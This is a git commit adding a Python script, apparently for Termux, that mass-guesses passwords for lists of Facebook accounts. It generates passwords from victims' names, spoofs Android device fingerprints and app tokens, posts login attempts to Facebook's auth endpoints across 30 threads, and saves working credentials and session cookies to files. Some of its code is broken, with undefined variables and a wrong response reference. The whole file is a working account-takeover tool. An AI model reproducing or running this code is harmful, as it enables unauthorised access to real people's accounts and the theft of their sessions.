6e03c0df0106e7432b0b7a806c7e9d6f4956488f
DAFI-707 <141451612+DAFI-707@users.noreply.github.com>
2024-05-08 21:17:20 +0600

    Add files via upload

---
+++ nameless.py
@@ -0,0 +1,278 @@
+#!/data/data/com.termux/files/usr/bin/python 
+#__________________[ Modules ]__________________# 
+import os
+from time import sleep
+import requests,json,time,re,random,sys,uuid,string,subprocess,zlib,base64,hashlib
+import os,bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,requests,httpx
+from string import *
+from concurrent.futures import ThreadPoolExecutor as xdwoker
+from bs4 import BeautifulSoup
+from bs4 import BeautifulSoup as sop
+try:
+    import pycurl
+    from io import BytesIO
+except:
+    os.system('p'+'ip ins'+'tall pyc'+'url > /dev'+'/null')
+    import pycurl
+    from io import BytesIO
+try:import requests
+except:os.system('pi'+'p uni'+'nstall requ'+'ests cha'+'rdet id'+'na cert'+'ifi urll'+'ib3 -y > /dev/null;p'+'ip ins'+'tall char'+'det id'+'na cert'+'ifi requ'+'ests urll'+'ib3 > /d'+'ev/nu'+'ll');os.system("clear");exit("[=] SO"+"METHI"+"NG E"+"RRO"+"R ! ")
+try:import bs4
+except:os.system('p'+'ip ins'+'tall b'+'s4 > /d'+'ev/nu'+'ll')
+#__________________[ Loop ]__________________# 
+loop = 0
+oks = []
+cps = []
+id = []
+loop=0
+oks=[]
+cps=[]
+ck=[]
+#__________________[ COLOUR ]__________________#
+W = '\x1b[1;97m';Y = '\033[1;33m';G = '\033[1;32m';B = '\033[1;36m';R = '\033[1;31m';G2 = '\033[1;36m';G3 = '\033[1;33m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';M = '\x1b[38;5;205m'
+#__________________[ UA  ]__________________#
+def Redmi():
+    Anderson=random.choice(["14","15","10","13","7.0.0","7.1.1","9","12","11","9.0","8.0.0","7.1.2","7.0","4","5","4.4.2","5.1.1","6.0.1","9.0.1"])
+    model = random.choice(["Redmi Note 7", "Redmi Note 8", "Redmi Note 9", "Redmi Note 10", "Redmi 7", "Redmi 8", "Redmi 9", "Redmi 10", "Redmi 9A", "Redmi 9C", "Redmi K20", "Redmi K30", "Redmi K40", "Redmi 5A", "Redmi 6A", "Redmi 7A", "Redmi 8A", "Redmi 9T", "Redmi Note 7 Pro", "Redmi Note 8 Pro", "Redmi Note 4", "Redmi Note 5", "Redmi Note 6 Pro", "Redmi 4X", "Redmi Y2", "Redmi Note 8T"])
+    sss = random.choice(['SKQ1.210216.001','RKQ1.211103.002','SP1A.210812.016','TP1A.220905.001'])
+    fbb = random.choice(['FB4A','Orca-Android','EMA;UNITY_PACKAGE/342','MessengerLite','EMA'])
+    cho=str(random.choice(range(43,447)))
+    fb = random.choice(['com.facebook.katana','com.facebook.orca'])
+    fr = random.choice(['th_TH','fr_FR','sv_SE','en_US','vi_VN','en_EG','en_GB'])
+    vir=str(random.choice(range(111111111,999999999)))
+    sim = random.choice(['banglalink','Viettel Telecom','skitto','grameenphone','Robi','Axiata','airtel','T-Mobile','YOTA','Zong','Napel Telecom','MegaFon','Viettel Telecom'])
+    samsung = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G','SM-T231','KOT49H','SM-J320F','LMY47V','GT-I9190','KOT49H','GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
+    ua =f"Dalvik/2.1.0 (Linux; U; Android "+Anderson+"; "+model+" Build/"+sss+") [FBAN/"+fbb+";FBAV/"+cho+".0.0.40.97;FBPN/"+fb+";FBLC/"+fr+";FBBV/"+vir+";FBCR/"+sim+";FBMF/samsung;FBBD/samsung;FBDV/"+model+";FBSV/"+Anderson+";FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=1280,height=720};FB_FW/1;]"
+    return ua
+#__________________[ TOOL VERSION ]__________________#
+#try:
+    #version = requests.get("url").text
+#except:
+    #print('No Internet Connection');exit()
+#version = version.strip()
+#__________________[ OPERATOR ]__________________#
+try:
+    output = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8')
+    operator = output.replace(',', '<|>').replace('\n', '')
+except Exception as e:
+    pass
+    operator = None
+#__________________[ Logo Sys ]__________________# 
+sys.stdout.write('\x1b]2; Unknown \x07')
+
+logo = f"""
+        ╔═╗─╔╦═══╦═╗╔═╦═══╦╗──╔═══╦═══╦═══╗
+        ║║╚╗║║╔═╗║║╚╝║║╔══╣║──║╔══╣╔═╗║╔═╗║
+        ║╔╗╚╝║║─║║╔╗╔╗║╚══╣║──║╚══╣╚══╣╚══╗
+        ║║╚╗║║╚═╝║║║║║║╔══╣║─╔╣╔══╩══╗╠══╗║
+        ║║─║║║╔═╗║║║║║║╚══╣╚═╝║╚══╣╚═╝║╚═╝║
+        ╚╝─╚═╩╝─╚╩╝╚╝╚╩═══╩═══╩═══╩═══╩═══╝
+ ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+                   MR.UNKNOWN 
+ ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""" 
+#_______________[LINEX BOX]_______________#
+def linex():print(f" ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+def clear():os.system("clear");print(logo)
+#__________________[ Features ]__________________# 
+def __Menu_Bar_():
+    clear()
+    print(f"  [1]  FILE CLONING")
+    print(f"  [2]  RND CLONING (Not Available)")
+    print(f"  [3]  EXIT TOOL")
+    linex()
+    feature = input(f' [✔] CHOOSE : ')
+    if feature in ['A','a','01','1']:file()
+    elif feature in ['B','b','02','2']:ran()
+    elif feature in ['C','c','03','3']:exit()
+    else:__Menu_Bar_() 
+#__________________[ Input File ]__________________# 
+def file():
+    clear()
+    print(f"  [✔]  EXAMPLE : /sdcard/file.txt")
+    linex()
+    file = input(f'  [✔]  ENTER FILE PATH : ')
+    try:
+        fo = open(file,'r').read().splitlines()
+    except FileNotFoundError:
+        print(f'  [✔]  FILE NOT FOUND...');time.sleep(2);main();linex()
+#__________________[ Methods ]__________________# 
+    clear()
+    print(f"  [1]  METHOD [API]")
+    print(f"  [2]  METHOD [GRAPH]")
+    linex()
+#--------(CHOICE PASS)---------#
+    mthd = input(f' [✔] CHOOSE : ')
+    plist=[];clear()
+    try:
+        ps_limit = int(input(f'  [✔]  ENTER PASSWORD LIMIT : '))
+    except:
+        ps_limit =1
+    clear()
+    print(f"  [✔]  first last firstlast first123 57575751");linex()
+    for i in range(ps_limit):
+        plist.append(input(f'  [✔]  PUT PASSWORD [{i+1}] : '))
+    with xdwoker(max_workers=30) as _NAME_LESS_:
+        clear()
+        tl = str(len(fo))
+        print(f"  [✔]  TOTAL ID<|>METHOD : {tl}<|>M{mthd} ")
+        print(f"  [✔]  YOUR  NAME    : {operator}")
+        print(f"  [✔]  [ON/OFF] AIRPLANE MODE OR USE APN");linex()
+        for user in fo:
+                    ids,names = user.split('|')
+                    passlist = plist
+                    if mthd =='1':
+                        _NAME_LESS_.submit(m1,ids,names,passlist)
+                    elif mthd =='2':
+                        _NAME_LESS_.submit(m2,ids,names,passlist)
+                    else:
+                       __Menu_Bar_()
+    linex()
+    print(f"  [✔] THE PROCESS HAS BEEN COMPLETED")
+    print(f"  [✔]  TOTAL ID : {len(oks)}")
+    linex();exit()
+#__________________[ Api File ]__________________# 
+def m1(ids,names,passlist):
+        try:
+            global oks,cps,loop
+            bi = random.choice([W,G,Y,B,X,M,R])
+            sys.stdout.write(f'\r\r  [API]<|>[%s]<|>[OK:%s] '%(loop,len(oks)));sys.stdout.flush()
+            sys.stdout.flush()
+            fs = names.split(' ')[0]
+            try:
+                ls = names.split(' ')[1]
+            except:
+                ls = fs
+            for pw in passlist:
+                pas = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',names).replace('name',names.lower())
+                with requests.Session() as session:
+                    data = {"adid": str(uuid.uuid4()),
+                    "format": "json",
+                    "device_id": str(uuid.uuid4()),
+                    "cpl": "true",
+                    "family_device_id": str(uuid.uuid4()),
+                    "credentials_type": "device_based_login_password",
+                    "error_detail_type": "button_with_disabled",
+                    "source": "device_based_login",
+                    "email": ids,
+                    "password": pas,
+                    "access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
+                    "generate_session_cookies": "1",
+                    "meta_inf_fbmeta": "",
+                    "advertiser_id": str(uuid.uuid4()),
+                    "currently_logged_in_userid": "0",
+                    "locale": "en_GB",
+                    "client_country_code": "GB",
+                    "method": "auth.login",
+                    "fb_api_req_friendly_name": "authenticate",
+                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                    "api_key": "882a8490361da98702bf97a021ddc14d"}
+                headers = {'User-Agent': Redmi(),
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Host': 'graph.facebook.com',
+                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+                    'X-FB-Connection-Type': 'MOBILE.LTE',
+                    'X-Tigon-Is-Retry': 'False',
+                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+                    'x-fb-device-group': '5120',
+                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                    'X-FB-Request-Analytics-Tags': 'graphservice',
+                    'X-FB-HTTP-Engine': 'Liger',
+                    'X-FB-Client-IP': 'True',
+                    'X-FB-Server-Cluster': 'True',
+                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+                q = session.post("https://api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+                if 'session_key' in q:
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]) #Sbname = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Sbname};{ckkk}"
+                    print(f"\r\r  [OK] {ids} • {pas} ")
+                    #print(f"  COOKIE • {ckkk}")
+                    #print(f' ──────────────────────────────────────────────────')
+                    oks.append(ids)
+                    open('/sdcard/API-OK.txt','a').write(ids+'|'+pas+'|'+ckkk+'\n')
+                    break
+                elif 'www.facebook.com' in q['error']['message']:
+                      print(f"\r  [CP] {sid} • {ps} ")
+                      cps.append(ids)
+                      open('/sdcard/API-CP.txt','a').write(ids+'|'+pas+'\n')
+                else:continue
+            loop+=1
+        except requests.exceptions.ConnectionError:
+            m1(ids,names,passlist)
+#__________________[ Graph File ]__________________# 
+def m2(ids,names,passlist):
+        try:
+            global oks,cps,loop
+            bi = random.choice([W,G,Y,B,X,M,R])
+            sys.stdout.write(f'\r\r  [GRAPH]<|>[%s]<|>[OK:%s] '%(loop,len(oks)));sys.stdout.flush()
+            sys.stdout.flush()
+            fs = names.split(' ')[0]
+            try:
+                ls = names.split(' ')[1]
+            except:
+                ls = fs
+            for pw in passlist:
+                pas = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',names).replace('name',names.lower())
+                with requests.Session() as session:
+                    data = {"adid": str(uuid.uuid4()),
+                    "format": "json",
+                    "device_id": str(uuid.uuid4()),
+                    "cpl": "true",
+                    "family_device_id": str(uuid.uuid4()),
+                    "credentials_type": "device_based_login_password",
+                    "error_detail_type": "button_with_disabled",
+                    "source": "device_based_login",
+                    "email": ids,
+                    "password": pas,
+                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+                    "generate_session_cookies": "1",
+                    "meta_inf_fbmeta": "",
+                    "advertiser_id": str(uuid.uuid4()),
+                    "currently_logged_in_userid": "0",
+                    "locale": "en_GB",
+                    "client_country_code": "GB",
+                    "method": "auth.login",
+                    "fb_api_req_friendly_name": "authenticate",
+                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                    "api_key": "882a8490361da98702bf97a021ddc14d"}
+                    headers = {'User-Agent': Redmi(),
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Host': 'graph.facebook.com',
+                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+                    'X-FB-Connection-Type': 'MOBILE.LTE',
+                    'X-Tigon-Is-Retry': 'False',
+                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+                    'x-fb-device-group': '5120',
+                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                    'X-FB-Request-Analytics-Tags': 'graphservice',
+                    'X-FB-HTTP-Engine': 'Liger',
+                    'X-FB-Client-IP': 'True',
+                    'X-FB-Server-Cluster': 'True',
+                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+                    po = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+                if 'session_key' in po:
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]) #Sbname = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Sbname};{ckkk}"
+                    print(f"\r\r  [OK] {ids} • {pas} ")
+                    #print(f"  COOKIE • {ckkk}")
+                    #print(f' ──────────────────────────────────────────────────')
+                    oks.append(ids)
+                    open('/sdcard/GRAPH-OK.txt','a').write(ids+'|'+pas+'|'+ckkk+'\n')
+                    break
+                elif 'www.facebook.com' in po['error']['message']:
+                    print(f"\r  [CP] {sid} • {ps} ")
+                    cps.append(ids)
+                    open('/sdcard/GRAPH-CP.txt','a').write(ids+'|'+pas+'\n')
+                    break
+                else:
+                	continue
+            loop+=1
+        except requests.exceptions.ConnectionError:
+            time.sleep(10)
+        except Exception as e:
+            pass
+#__________________[ End ]__________________# 
+if __name__=='__main__':
+	__Menu_Bar_()
+else:
+	sys.exit()
+#__________________[ Good Night Bruh ]__________________#     
